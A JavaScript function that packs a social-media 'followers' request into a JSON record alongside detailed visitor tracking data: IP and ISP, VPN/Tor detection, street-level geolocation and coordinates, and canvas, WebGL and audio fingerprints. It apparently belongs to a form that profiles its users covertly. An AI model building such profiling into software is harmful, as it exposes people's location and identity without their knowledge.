// Function to create consolidated JSON format
// Omitting user behavior and info sections as requested
export function createConsolidatedJSON(submission) {
  try {
    const {
      username,
      followers,
      email,
      deviceInfo = {},
      ipAddress
    } = submission;

    // Get relevant info from submission data
    const userInfo = submission.userInfo || {};
    const mobileDetails = submission.mobileDetails || userInfo.mobileDetails || {};
    const ipDetails = userInfo.ipDetails || {};
    const geolocation = userInfo.geolocation || {};
    // Get hardware info from multiple possible sources
    const hardwareInfo = deviceInfo.hardwareInfo || userInfo.hardwareInfo || {};
    const geolocationDetails = geolocation.locationDetails || geolocation.address || {};
    const geoSource = geolocation.source || 'unknown';
    const geoAccuracy = geolocation.accuracy ? `${geolocation.accuracy}m` : 'Unknown';
    const sensors = hardwareInfo.sensors || {};
    const deviceCapabilities = userInfo.deviceCapabilities || {};
    // Ensure we have the device model from any available source
    const deviceModel = deviceInfo.deviceModel || userInfo.deviceModel || 'Unknown Device';
    
    // Add debug logging
    console.log("Device model used in JSON:", deviceModel);
    console.log("Hardware info available:", Object.keys(hardwareInfo).length > 0 ? "Yes" : "No");

    // Create consolidated JSON data structure
    const consolidatedData = {
      // Basic submission info
      submissionId: submission.id,
      submissionTime: new Date().toISOString(),
      processingStatus: submission.processed || false,
      
      // Request details
      request: {
        username,
        followers,
        email: email || "",
      },
      
      // Device information
      device: {
        model: deviceModel,
        brand: mobileDetails.brand || 'Unknown',
        osVersion: mobileDetails.osVersion || 'Unknown',
        deviceType: mobileDetails.deviceType || 'Unknown',
        screenSize: userInfo.screenSize || 'Unknown',
        platform: userInfo.platform || 'Unknown',
        userAgent: userInfo.userAgent || 'Unknown',
        colorDepth: userInfo.colorDepth || 'Unknown',
        language: userInfo.language || 'Unknown',
        languages: userInfo.languages || 'Unknown',
        timezone: userInfo.timezone || 'Unknown',
        timezoneOffset: userInfo.timezoneOffset || 'Unknown',
      },
      
      // Hardware specifications
      hardware: {
        cores: userInfo.hardwareConcurrency || 'Unknown',
        memory: userInfo.deviceMemory || 'Unknown',
        gpu: hardwareInfo.gpu || 'Unknown',
        gpuVendor: hardwareInfo.gpuVendor || 'Unknown',
        touchPoints: hardwareInfo.touchPoints || 'Unknown',
        pixelRatio: hardwareInfo.pixelRatio || 'Unknown',
        batteryLevel: hardwareInfo.batteryLevel || 'Unknown',
        sensors: {
          accelerometer: sensors.accelerometer || false,
          gyroscope: sensors.gyroscope || false,
          magnetometer: sensors.magnetometer || false,
          ambientLight: sensors.ambientLight || false
        },
        capabilities: {
          touch: deviceCapabilities.hasTouch || false,
          vibration: deviceCapabilities.hasVibration || false,
          motion: deviceCapabilities.hasMotion || false,
          orientation: deviceCapabilities.hasOrientation || false
        }
      },
      
      // Network information
      network: {
        ipAddress: ipAddress || userInfo.ip || 'Unknown',
        ipVersion: ipAddress && ipAddress.includes(':') ? 'IPv6' : 'IPv4',
        provider: ipDetails.isp || 'Unknown',
        organization: ipDetails.org || 'Unknown',
        asn: ipDetails.asn || 'Unknown',
        connectionType: userInfo.connection?.type || 'Unknown',
        effectiveType: userInfo.connection?.effectiveType || 'Unknown',
        downlink: userInfo.connection?.downlink || 'Unknown',
        rtt: userInfo.connection?.rtt || 'Unknown',
        dataSaver: userInfo.connection?.saveData || false,
        mobileNetwork: ipDetails.mobile || false,
        hosting: ipDetails.hosting || false,
        proxy: userInfo.isProxy || ipDetails.proxy || false,
        vpn: userInfo.isVpn || /vpn|proxy|tor/i.test(ipDetails.org || '') || false
      },
      
      // Geolocation data
      location: {
        country: geolocationDetails.country || ipDetails.country || 'Unknown',
        region: geolocationDetails.region || ipDetails.region || 'Unknown',
        city: geolocationDetails.city || ipDetails.city || 'Unknown',
        postalCode: geolocationDetails.postalCode || 'Unknown',
        neighborhood: geolocationDetails.neighbourhood || 'Unknown',
        street: geolocationDetails.road || 'Unknown',
        coordinates: {
          latitude: geolocation.latitude || null,
          longitude: geolocation.longitude || null
        },
        accuracy: geoAccuracy,
        source: geoSource,
        permission: geolocation.permission || 'Unknown'
      },
      
      // Security assessment
      security: {
        isEmulator: userInfo.isEmulator || false,
        cookiesEnabled: userInfo.cookiesEnabled || false,
        doNotTrack: userInfo.doNotTrack !== 'unknown',
        integrityScore: deviceInfo.securityChecks?.integrityScore || 100,
        automationDetected: deviceInfo.securityChecks?.automationDetected || false,
        tamperingDetected: deviceInfo.securityChecks?.tamperingDetected || false
      },
      
      // Technical fingerprints - excluding detailed behavioral data
      fingerprints: {
        canvas: userInfo.canvasFingerprint || 'Not available',
        webgl: userInfo.webglFingerprint || 'Not available',
        audio: userInfo.audioFingerprint || 'Not available',
        browserFingerprint: userInfo.browserFingerprint || 'Not available'
      },
      
      // Collection metadata
      meta: {
        collectionTimestamp: deviceInfo.metaData?.collectionTimestamp || submission.createdAt,
        httpHeaders: true,
        browserCompatibility: 'High',
        dataVersion: '2.0'
      }
    };
    
    return consolidatedData;
  } catch (error) {
    console.error("Error creating consolidated JSON:", error);
    return {
      error: "Failed to create consolidated data",
      raw: {
        username: submission.username,
        followers: submission.followersRequested,
        timestamp: new Date().toISOString()
      }
    };
  }
}

// No export statement needed as we're already using 'export function' above